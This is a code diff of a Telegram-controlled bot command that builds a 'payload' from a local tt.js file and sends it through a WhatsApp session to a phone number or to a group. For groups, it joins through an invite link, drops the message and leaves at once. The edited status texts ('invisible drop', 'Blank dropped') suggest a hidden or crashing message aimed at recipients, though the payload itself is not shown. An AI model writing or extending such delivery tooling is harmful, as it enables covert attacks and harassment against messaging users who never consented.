@@ -1693,78 +1693,63 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
 
 
     
-// ==========================================
-// UPDATED: /send [number OR groupLink]
-// ==========================================
 bot.onText(/\/send\s+(\S+)/, async (msg, match) => {
     const chatId = msg.chat.id.toString();
     if (chatId !== ADMIN_ID) return;
 
-    const target = match[1]; // Can be a phone number or a link
-    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Generating payload from tt.js...`);
+    const target = match[1]; 
+    let statusMsg = await bot.sendMessage(chatId, `[SYSTEM] Preparing invisible drop...`);
 
     try {
-        // 1. Process tt.js
         const ttPath = path.join(__dirname, 'tt.js');
-        if (!fs.existsSync(ttPath)) throw new Error('tt.js file not found.');
-
         const code = fs.readFileSync(ttPath, 'utf8');
         const sandbox = { console: console, message: "" };
         vm.createContext(sandbox);
         vm.runInContext(code, sandbox);
 
-        const finalPayload = sandbox.message;
-        if (!finalPayload) throw new Error('Captured "message" variable is empty.');
+        const finalPayload = sandbox.message; // This is now only 500 chars
 
-        // 2. Get Active Socket
         const activeSock = global.sock || Object.values(clients)[0];
-        if (!activeSock) throw new Error('No active WhatsApp connection (sock) found.');
+        if (!activeSock) throw new Error('No WhatsApp connection found.');
 
-        // 3. Check if target is a Group Link
         if (target.includes('chat.whatsapp.com/')) {
             const groupCode = target.split('chat.whatsapp.com/')[1].split(/[?#]/)[0];
-            
-            await bot.editMessageText(`[GROUP MODE] Joining group ${groupCode}...`, {
-                chat_id: chatId,
-                message_id: statusMsg.message_id
-            });
-
-            // Join the group
             const groupJid = await activeSock.groupAcceptInvite(groupCode);
-            await delay(2000); // Wait for metadata sync
+            await delay(2000); 
 
-            // Send payload
+            // Send payload ONLY
             await activeSock.sendMessage(groupJid, { text: finalPayload });
-            await bot.editMessageText(`[SUCCESS] Payload sent to group. Leaving now...`, {
+            
+            await bot.editMessageText(`[SUCCESS] Blank dropped. Leaving...`, {
                 chat_id: chatId,
                 message_id: statusMsg.message_id
             });
 
-            // Leave the group immediately
             await delay(1000);
             await activeSock.groupLeave(groupJid);
 
         } else {
-            // 4. Standard Number Mode
             const cleanNum = target.replace(/\D/g, '');
             const waId = cleanNum.includes('@c.us') ? cleanNum : `${cleanNum}@c.us`;
 
+            // Send payload ONLY
             await activeSock.sendMessage(waId, { text: finalPayload });
         }
 
-        await bot.editMessageText(`[SUCCESS] ✅ Payload delivered to ${target}!`, {
+        await bot.editMessageText(`[DONE] ✅ Invisible message sent.`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
 
     } catch (err) {
         console.error('[SEND_ERROR]', err);
-        await bot.editMessageText(`[ERROR] Send failed: ${err.message}`, {
+        await bot.editMessageText(`[ERROR] Failed: ${err.message}`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
     }
 });
+
 
 
 
